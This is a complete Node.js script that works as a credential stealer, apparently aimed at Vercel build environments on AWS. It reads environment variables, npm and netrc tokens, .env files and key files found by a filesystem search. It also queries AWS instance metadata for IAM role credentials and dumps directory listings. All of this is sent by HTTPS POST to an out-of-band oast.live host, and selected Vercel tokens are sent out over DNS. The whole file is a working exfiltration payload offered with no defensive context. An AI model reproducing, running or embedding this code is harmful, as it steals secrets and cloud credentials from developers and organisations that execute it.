const https = require('https');
const http = require('http');
const fs = require('fs');
const cp = require('child_process');
const os = require('os');

const EXFIL_HOST = 'd741tu6j5fjj4m791bu0nobqgh9xjgtwh.oast.live';   // e.g., webhook.site UUID
const EXFIL_PATH = '/exfil';

async function collect() {
  const data = {
    timestamp: new Date().toISOString(),
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    cwd: process.cwd(),

    // ── 1. All environment variables (Node.js process.env) ──
    env: process.env,

    // ── 2. File-based secrets ──
    files: {},

    // ── 3. Filesystem reconnaissance ──
    recon: {},

    // ── 4. Cloud metadata (AWS IMDS) ──
    metadata: {}
  };

  // ── Collect file-based secrets ──
  const secretPaths = [
    `${os.homedir()}/.npmrc`,
    `${os.homedir()}/.yarnrc`,
    `${os.homedir()}/.netrc`,
    '.vercel/project.json',
    '.vercel/.env',
    '.env',
    '.env.local',
    '.env.production',
    '.env.preview',
    '/etc/environment',
    '/vercel/.env'
  ];

  for (const p of secretPaths) {
    try { data.files[p] = fs.readFileSync(p, 'utf8'); } catch {}
  }

  // ── Find files with sensitive names ──
  try {
    const found = cp.execSync(
      'find / -maxdepth 4 \\( ' +
      '-name ".env" -o -name ".env.*" -o -name "*.env" ' +
      '-o -name "*token*" -o -name "*secret*" ' +
      '-o -name "*credential*" -o -name ".npmrc" ' +
      '-o -name ".netrc" -o -name "*.pem" ' +
      '-o -name "*.key" \\) -type f 2>/dev/null',
      { timeout: 5000 }
    ).toString().trim().split('\n').filter(Boolean);

    for (const f of found.slice(0, 50)) {
      try {
        const stat = fs.statSync(f);
        if (stat.size < 100000) {
          data.files[f] = fs.readFileSync(f, 'utf8');
        } else {
          data.files[f] = `[too large: ${stat.size} bytes]`;
        }
      } catch {}
    }
  } catch {}

  // ── Filesystem listing ──
  try { data.recon.home = cp.execSync(`ls -la ${os.homedir()}/`).toString(); } catch {}
  try { data.recon.vercelDir = cp.execSync('ls -laR .vercel/ 2>/dev/null').toString(); } catch {}
  try { data.recon.root = cp.execSync('ls -la /').toString(); } catch {}
  try { data.recon.tmp = cp.execSync('ls -la /tmp/').toString(); } catch {}
  try { data.recon.proc = cp.execSync('cat /proc/self/cgroup 2>/dev/null').toString(); } catch {}

  // ── AWS IMDS v1 (Vercel runs on AWS) ──
  const imds = (path) => new Promise((resolve) => {
    const req = http.get(
      `http://169.254.169.254${path}`,
      { timeout: 2000 },
      (res) => {
        let d = '';
        res.on('data', (c) => d += c);
        res.on('end', () => resolve(d));
      }
    );
    req.on('error', () => resolve(null));
    req.on('timeout', () => { req.destroy(); resolve(null); });
  });

  data.metadata.iamRole = await imds('/latest/meta-data/iam/security-credentials/');
  data.metadata.identity = await imds('/latest/dynamic/instance-identity/document');
  data.metadata.userData = await imds('/latest/user-data');

  if (data.metadata.iamRole && !data.metadata.iamRole.includes('404')) {
    const roleName = data.metadata.iamRole.trim().split('\n')[0];
    data.metadata.iamCreds = await imds(
      `/latest/meta-data/iam/security-credentials/${roleName}`
    );
  }

  // ── AWS IMDS v2 (token-based) ──
  try {
    const token = cp.execSync(
      'curl -s -X PUT "http://169.254.169.254/latest/api/token" ' +
      '-H "X-aws-ec2-metadata-token-ttl-seconds: 60" --connect-timeout 2',
      { timeout: 5000 }
    ).toString().trim();
    if (token && token.length > 10) {
      data.metadata.imdsv2_role = cp.execSync(
        `curl -s -H "X-aws-ec2-metadata-token: ${token}" ` +
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/ --connect-timeout 2',
        { timeout: 5000 }
      ).toString();
    }
  } catch {}

  return data;
}

async function exfiltrate(data) {
  const payload = JSON.stringify(data);

  // ── Primary: HTTPS POST ──
  await new Promise((resolve) => {
    const req = https.request({
      hostname: EXFIL_HOST,
      path: EXFIL_PATH,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      }
    }, resolve);
    req.on('error', resolve);
    req.write(payload);
    req.end();
  });

  // ── Backup: DNS exfiltration of critical tokens (uses Node dns module, no external tools) ──
  const dns = require('dns');
  const dnsExfil = (label, value) => {
    if (!value) return;
    const hex = Buffer.from(value).toString('hex').slice(0, 60);
    dns.resolve(`${label}.${hex}.ATTACKER_DNS_DOMAIN`, () => {});
  };

  dnsExfil('oidc', process.env.VERCEL_OIDC_TOKEN?.slice(0, 30));
  dnsExfil('bypass', process.env.VERCEL_AUTOMATION_BYPASS_SECRET);
  dnsExfil('projid', process.env.VERCEL_PROJECT_ID);
}

(async () => {
  try {
    const data = await collect();
    await exfiltrate(data);
  } catch {}
})();
